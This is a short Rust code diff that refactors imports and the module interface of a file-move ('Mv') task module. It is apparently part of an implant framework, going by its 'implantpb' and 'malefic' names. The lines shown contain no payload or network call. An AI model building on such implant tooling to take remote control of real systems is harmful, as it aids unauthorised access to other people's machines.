@@ -1,8 +1,4 @@
-use async_trait::async_trait;
-use malefic_trait::module_impl;
-use crate::{check_request, Module, Result, check_field, TaskResult};
-use malefic_proto::proto::implantpb::spite::Body;
-
+use crate::prelude::*;
 
 pub struct Mv {}
 
@@ -11,8 +7,8 @@ pub struct Mv {}
 impl Module for Mv {}
 
 #[async_trait]
-impl crate::ModuleImpl for Mv {
-    async fn run(&mut self, id: u32, receiver: &mut crate::Input, _sender: &mut crate::Output) -> Result {
+impl malefic_proto::module::ModuleImpl for Mv {
+    async fn run(&mut self, id: u32, receiver: &mut malefic_proto::module::Input, _sender: &mut malefic_proto::module::Output) -> ModuleResult {
         let request = check_request!(receiver, Body::Request)?;
 
         let args = check_field!(request.args, 2)?;
